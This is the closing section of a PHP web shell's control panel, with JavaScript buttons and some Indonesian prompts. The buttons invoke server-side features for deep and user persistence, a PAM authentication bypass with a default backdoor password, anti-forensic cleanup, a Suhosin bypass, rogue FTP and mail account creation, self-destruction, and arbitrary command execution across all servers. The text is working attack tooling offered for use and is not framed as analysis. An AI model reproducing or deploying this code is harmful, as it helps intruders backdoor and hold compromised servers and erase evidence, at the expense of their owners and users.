            function runListSpread(){fetch('?list_spread=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}

            function runSelfDestruct(){if(confirm('⚠️ HAPUS SCRIPT INI?')){window.location.href='?selfdestruct=1&confirm=yes';}}
            function runAntiForensic(){if(confirm('Anti-forensic ultimate?')){fetch('?anti_forensic=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runBypassSuhosin(){if(confirm('Bypass Suhosin?')){fetch('?bypass_suhosin=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runCreateFTP(){var u=prompt('Username:');if(u){var p=prompt('Password:');var h=prompt('Home:','/home/'+u);fetch('?create_ftp=1&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p||'')+'&home='+encodeURIComponent(h)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runCreateMail(){var e=prompt('Email:');if(e){var p=prompt('Password:');fetch('?create_mail=1&email='+encodeURIComponent(e)+'&pass='+encodeURIComponent(p||'')+'&domain='+encodeURIComponent(e.split('@')[1]||window.location.hostname)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runDeepPersistence(action){var msg=action==='install'?'Install deep persistence?':'Remove deep persistence?';if(confirm(msg)){fetch('?deep_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runPamBypass(action){if(action==='install'){var pass=prompt('Backdoor password (default: BackdoorPass123):')||'BackdoorPass123';if(confirm('Install PAM bypass?')){fetch('?pam_bypass=install&password='+encodeURIComponent(pass)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}else{if(confirm('Remove PAM bypass?')){fetch('?pam_bypass=remove').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}}
            function runUserPersistence(action){var msg=action==='install'?'Install user persistence?':'Remove user persistence?';if(confirm(msg)){fetch('?user_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runExecAll(){var cmd=prompt('Perintah untuk dijalankan di semua server:');if(cmd){fetch('?execall='+encodeURIComponent(cmd)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}
            function runLsAll(){var dir=prompt('Direktori untuk di-list di semua server:','/home');if(dir){fetch('?lsall='+encodeURIComponent(dir)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error'));}}

            window.onclick=function(e){document.querySelectorAll('.modal').forEach(m=>{if(e.target===m)hideModal(m.id);});}
            <?php if(isset($_GET['edit'])): ?><?php $file=$_GET['edit']; $filePath=$currentPath.DIRECTORY_SEPARATOR.$file; $content=(file_exists($filePath)&&is_file($filePath)&&isSafePath($filePath,$rootPath,$specialDirectories)&&in_array(strtolower(pathinfo($file,PATHINFO_EXTENSION)),$editableExtensions))?@file_get_contents($filePath):''; ?>document.addEventListener('DOMContentLoaded',function(){document.getElementById('fileContent').value=<?= json_encode($content) ?>;document.getElementById('editFileName').value=<?= json_encode($file) ?>;showModal('editModal');});<?php endif; ?>
            document.querySelector('a[href="?logout"]')?.addEventListener('click',function(e){e.preventDefault();if(confirm('Yakin logout?')){window.location.href='?logout=1';}});
        </script>
    <?php endif; ?>
</body>
</html>
